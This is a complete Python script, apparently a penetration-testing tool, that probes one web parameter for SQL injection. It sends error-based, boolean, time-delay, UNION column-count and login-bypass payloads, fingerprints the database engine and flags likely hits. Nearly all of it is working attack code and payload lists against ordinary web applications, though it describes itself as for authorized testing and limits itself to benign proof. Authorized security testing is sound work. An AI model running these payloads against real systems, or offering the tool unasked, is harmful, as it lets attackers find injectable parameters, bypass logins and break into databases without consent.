#!/usr/bin/env python3
"""
sqli_fuzz.py — authorized SQL-injection prober. Tests a single injection point (mark it FUZZ, or it appends to a
param / replaces FUZZ in --data) across the technique families and guesses the DBMS:
  - ERROR-BASED   (a DBMS error string appears → input reached the raw query; also fingerprints the engine)
  - BOOLEAN       (a TRUE condition vs a FALSE condition give a stable, different response → boolean oracle)
  - TIME          (a SLEEP/pg_sleep/WAITFOR payload delays the response while the SLEEP(0) control does not)
  - UNION         (ORDER BY climb finds the column count → candidate for UNION extraction)

A hit is a finding ONLY once you confirm the altered QUERY and prove impact safely
(SQL_INJECTION_TESTING_GUIDE.md §21/§25). SQLi is context- and DBMS-dependent — verify the break-out by hand.

Usage:
  python3 sqli_fuzz.py -u "https://target/item?id=FUZZ"
  python3 sqli_fuzz.py -u "https://target/item?id=1" --inject id
  python3 sqli_fuzz.py -u "https://target/login" --method POST --data "user=FUZZ&pass=x" --true "Welcome"
"""
import argparse, re, sys, time, urllib.parse as up

# be UTF-8-safe on Windows cp1252 consoles too (output uses → ⭐ §); harmless under WSL/Kali UTF-8
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

# DBMS error signatures → (label, regex). First match wins for the fingerprint. (§6)
DBMS_SIGS = [
    ("MySQL/MariaDB", r"SQL syntax.*MySQL|check the manual that corresponds to your (?:MySQL|MariaDB)|"
                      r"valid MySQL result|mysqli?_|MySqlException"),
    ("PostgreSQL",    r"PostgreSQL.*ERROR|pg_query\(\)|unterminated quoted string|syntax error at or near|PSQLException"),
    ("Microsoft SQL Server", r"Unclosed quotation mark|Microsoft SQL|ODBC SQL Server|SQLServerException|"
                             r"Incorrect syntax near|Conversion failed when converting"),
    ("Oracle",        r"\bORA-\d{5}\b|Oracle error|quoted string not properly terminated|PLS-\d{5}"),
    ("SQLite",        r"SQLite/JDBCDriver|SQLite\.Exception|unrecognized token|SQL logic error|sqlite3\."),
]
GENERIC_ERR = re.compile(r"SQL syntax|syntax error|unterminated|unexpected|odbc|jdbc|sqlstate|warning:.*\b(pg|mysqli|oci)_",
                         re.I)
# errors specific to too-many-columns in ORDER BY / UNION (column-count signal) §9
UNION_ERR = re.compile(r"unknown column|order clause|ORDER BY position|not in select list|"
                       r"different number of columns|do not have the same number", re.I)

# context-breakers / error probes (benign — they only break or balance the query, never destroy) §5
PROBES = ["'", "\"", "')", "';", "\\", "1'\"", ")", " AND 1=1-- -", " AND 1=2-- -"]

# boolean true/false pairs to try (numeric + string contexts) §7
BOOL_PAIRS = [
    (" AND 1=1-- -",      " AND 1=2-- -"),
    ("' AND '1'='1",      "' AND '1'='2"),
    ("\" AND \"1\"=\"1",  "\" AND \"1\"=\"2"),
    (" OR 1=1-- -",       " OR 1=2-- -"),
]

# time payloads per engine: (label, sleep-N template). {n} = seconds. §8
TIME_PAYLOADS = [
    ("MySQL",      " AND SLEEP({n})-- -"),
    ("MySQL(str)", "' AND SLEEP({n})-- -"),
    ("PostgreSQL", "' AND 1=(SELECT 1 FROM pg_sleep({n}))-- -"),
    ("PostgreSQL(stacked)", "'; SELECT pg_sleep({n})-- -"),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:{n}'-- -"),
    ("Oracle",     "' AND 1=(CASE WHEN(1=1) THEN dbms_pipe.receive_message(('a'),{n}) ELSE 1 END)-- -"),
]


def build_req(url, data, inject_field, payload):
    """Return (url, data) with `payload` placed at the FUZZ marker / chosen field.
    Precedence: FUZZ marker > --inject named param > append a `q=` (or named) param."""
    enc = up.quote(payload, safe="")
    if data:
        if "FUZZ" in data:
            return url, data.replace("FUZZ", enc)
        pairs, replaced = [], False
        for kv in data.split("&"):
            k = kv.split("=", 1)[0]
            if inject_field and k == inject_field:
                pairs.append(f"{k}={enc}"); replaced = True
            else:
                pairs.append(kv)
        if inject_field and not replaced:
            pairs.append(f"{inject_field}={enc}")
        return url, "&".join(pairs)
    # GET
    if "FUZZ" in url:
        return url.replace("FUZZ", enc), None
    parsed = up.urlsplit(url)
    pairs, replaced = [], False
    for kv in parsed.query.split("&") if parsed.query else []:
        k = kv.split("=", 1)[0]
        if inject_field and k == inject_field:
            pairs.append(f"{k}={enc}"); replaced = True
        else:
            pairs.append(kv)
    if not replaced:                       # named param absent (or none given) → append it
        pairs.append(f"{inject_field or 'q'}={enc}")
    new_q = "&".join(pairs)
    return up.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_q, parsed.fragment)), None


def send(sess, method, url, data, timeout):
    try:
        t0 = time.time()
        if method == "POST":
            r = sess.post(url, data=data, headers={"User-Agent": UA}, timeout=timeout,
                          verify=False, allow_redirects=False)
        else:
            r = sess.get(url, headers={"User-Agent": UA}, timeout=timeout,
                         verify=False, allow_redirects=False)
        r._elapsed_s = time.time() - t0
        return r
    except requests.exceptions.ReadTimeout:
        return "TIMEOUT"
    except Exception as e:
        print(f"   [!] request error: {e}")
        return None


def fingerprint(text):
    for label, rx in DBMS_SIGS:
        if re.search(rx, text, re.I):
            return label
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="target URL; mark the injection point with FUZZ (GET)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body; mark injection with FUZZ or use --inject <field>")
    ap.add_argument("--inject", help="param/field name to inject (if not using FUZZ)")
    ap.add_argument("--true", dest="truemark", help="success/'logged-in' marker → also tries auth-bypass payloads (§12)")
    ap.add_argument("--baseline", default="1", help="a normal value to baseline against (default: 1)")
    ap.add_argument("--sleep", type=int, default=5, help="seconds for the time-based test (default 5)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()
    sess = requests.Session()
    dbms_seen = set()

    # ---- baseline ----
    u, d = build_req(a.url, a.data, a.inject, a.baseline)
    rb = send(sess, a.method, u, d, a.timeout)
    if rb in (None, "TIMEOUT"):
        sys.exit("baseline request failed")
    base_len, base_code = len(rb.text), rb.status_code
    print(f"[*] baseline value={a.baseline!r}  status={base_code}  len={base_len}  time={rb._elapsed_s:.2f}s")

    # ---- error-based probes + fingerprint (§5/§6) ----
    print("\n[*] CONTEXT / ERROR probes (error-based + DBMS fingerprint):")
    for p in PROBES:
        u, d = build_req(a.url, a.data, a.inject, a.baseline + p)
        r = send(sess, a.method, u, d, a.timeout)
        if r in (None, "TIMEOUT"):
            continue
        tag = ""
        fp = fingerprint(r.text)
        if fp:
            dbms_seen.add(fp)
            tag = f"  [ERROR-BASED] {fp} error → input reaches the raw query (§6)"
        elif GENERIC_ERR.search(r.text):
            tag = "  [ERROR?] generic SQL-ish error string (confirm it's a query change, not a stack trace)"
        dl = len(r.text) - base_len
        print(f"   payload={p!r:16} status={r.status_code} len={len(r.text)} (delta {dl:+d}){tag}")

    # ---- boolean oracle (§7) ----
    print("\n[*] BOOLEAN probes (TRUE vs FALSE must differ STABLY):")
    for t_pl, f_pl in BOOL_PAIRS:
        ut, dt = build_req(a.url, a.data, a.inject, a.baseline + t_pl)
        uf, df = build_req(a.url, a.data, a.inject, a.baseline + f_pl)
        rt = send(sess, a.method, ut, dt, a.timeout)
        rf = send(sess, a.method, uf, df, a.timeout)
        if rt in (None, "TIMEOUT") or rf in (None, "TIMEOUT"):
            continue
        diff_len = len(rt.text) - len(rf.text)
        diff_code = rt.status_code != rf.status_code
        flag = ""
        if diff_code or diff_len != 0:
            # low-FP: re-request once and require the difference to REPRODUCE (sign + ~magnitude) → excludes jitter,
            # yet catches a small-but-real diff like "in stock" vs "out of stock" that a fixed byte-floor would miss.
            rt2 = send(sess, a.method, ut, dt, a.timeout)
            rf2 = send(sess, a.method, uf, df, a.timeout)
            if rt2 not in (None, "TIMEOUT") and rf2 not in (None, "TIMEOUT"):
                d2 = len(rt2.text) - len(rf2.text)
                c2 = rt2.status_code != rf2.status_code
                stable = (c2 == diff_code) and ((diff_len == 0) or
                          ((d2 > 0) == (diff_len > 0) and abs(d2 - diff_len) <= 3))
                if stable and (diff_code or abs(diff_len) >= 1):
                    flag = "  [BOOLEAN?] TRUE/FALSE differ & REPRODUCE → likely boolean oracle; confirm by hand (§7) ⭐"
        print(f"   T={t_pl!r:18} F={f_pl!r:18} lenΔ={diff_len:+d} codeΔ={diff_code}{flag}")

    # ---- time-based (§8) ----
    print(f"\n[*] TIME probes (looking for ~{a.sleep}s delay vs a SLEEP(0) control):")
    for label, tmpl in TIME_PAYLOADS:
        # control: sleep 0
        u0, d0 = build_req(a.url, a.data, a.inject, a.baseline + tmpl.format(n=0))
        r0 = send(sess, a.method, u0, d0, a.timeout)
        t0 = r0._elapsed_s if r0 not in (None, "TIMEOUT") else None
        # test: sleep N
        un, dn = build_req(a.url, a.data, a.inject, a.baseline + tmpl.format(n=a.sleep))
        rn = send(sess, a.method, un, dn, a.timeout + a.sleep)
        if rn == "TIMEOUT":
            print(f"   {label:18} TIMED OUT at sleep={a.sleep} → strong TIME signal; raise --timeout to measure (§8) ⭐")
            dbms_seen.add(label.split("(")[0])
            continue
        if rn in (None,) or t0 is None:
            continue
        delayed = rn._elapsed_s - t0
        flag = ""
        if delayed >= a.sleep * 0.7:
            flag = f"  [TIME-BLIND?] delayed ~{delayed:.1f}s on {label} → confirm repeatably (§8) ⭐⭐"
            dbms_seen.add(label.split("(")[0])
        print(f"   {label:18} sleep0={t0:.2f}s sleepN={rn._elapsed_s:.2f}s (Δ{delayed:+.1f}){flag}")

    # ---- UNION column count (§9) ----
    print("\n[*] UNION column-count probe (ORDER BY climb):")
    last_ok = 0
    for n in range(1, 13):
        u, d = build_req(a.url, a.data, a.inject, f"{a.baseline}' ORDER BY {n}-- -")
        r = send(sess, a.method, u, d, a.timeout)
        if r in (None, "TIMEOUT"):
            continue
        errored = bool(fingerprint(r.text) or GENERIC_ERR.search(r.text) or UNION_ERR.search(r.text)) \
            or r.status_code != base_code
        if errored:
            print(f"   ORDER BY {n} → error/changed ⇒ column count likely = {n-1} → UNION SELECT with {n-1} cols (§9) ⭐")
            last_ok = n - 1
            break
    if not last_ok:
        print("   (no clean column-count signal via ORDER BY — try UNION SELECT NULL,NULL,… manually, §9)")

    # ---- auth-bypass (only with --true) (§12) ----
    if a.truemark:
        print(f"\n[*] AUTH-BYPASS probes (looking for the success marker {a.truemark!r}):")
        for p in ["admin'-- -", "' OR '1'='1'-- -", "' OR 1=1 LIMIT 1-- -", "admin'#", "\") OR (\"1\"=\"1"]:
            u, d = build_req(a.url, a.data, a.inject, p)
            r = send(sess, a.method, u, d, a.timeout)
            if r in (None, "TIMEOUT"):
                continue
            hit = a.truemark in r.text or r.status_code in (301, 302, 303)
            flag = "  [AUTH BYPASS?] success marker / redirect → CONFIRM login by hand (§12) ⭐⭐⭐" if hit else ""
            print(f"   payload={p!r:22} status={r.status_code} len={len(r.text)}{flag}")

    # ---- summary ----
    print("\n" + "=" * 70)
    if dbms_seen:
        print(f"[+] DBMS guess: {', '.join(sorted(dbms_seen))}  → use that engine's block in the arsenal (§20).")
    else:
        print("[*] No DBMS fingerprinted yet (errors may be suppressed) — rely on boolean/time/UNION signals above.")
    print("[!] Reproduce any hit by hand: prove the QUERY changed (other rows / stable true-false / a controlled "
          "delay / a UNION value), not a reflected error. Benign proof only (version()+1 row); no mass dump; "
          "no destructive writes (§25).")


if __name__ == "__main__":
    main()
